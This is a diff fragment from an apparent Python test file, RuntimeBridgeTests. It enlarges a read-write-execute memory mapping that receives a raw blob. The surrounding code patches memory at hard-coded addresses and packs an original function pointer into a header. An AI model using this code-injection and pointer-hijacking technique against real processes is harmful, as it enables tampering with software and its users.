@@ -65,7 +65,7 @@ class RuntimeBridgeTests(unittest.TestCase):
         base=C.addressof(root)-0x066e9648
         obj[0]=base+0x053edca8
         C.c_uint32.from_address(C.addressof(obj)+0x14c).value=45950
-        with mmap.mmap(-1,16384,prot=7) as memory:
+        with mmap.mmap(-1,max(16384,len(blob)+4096),prot=7) as memory:
             memory.write(blob);address=C.addressof(C.c_char.from_buffer(memory));off=meta['symbols']['live_mailbox']
             def header(state=0,amount=45950):
                 return struct.pack('<10Q6I',0x3145474449523747,base,C.cast(original,C.c_void_p).value,
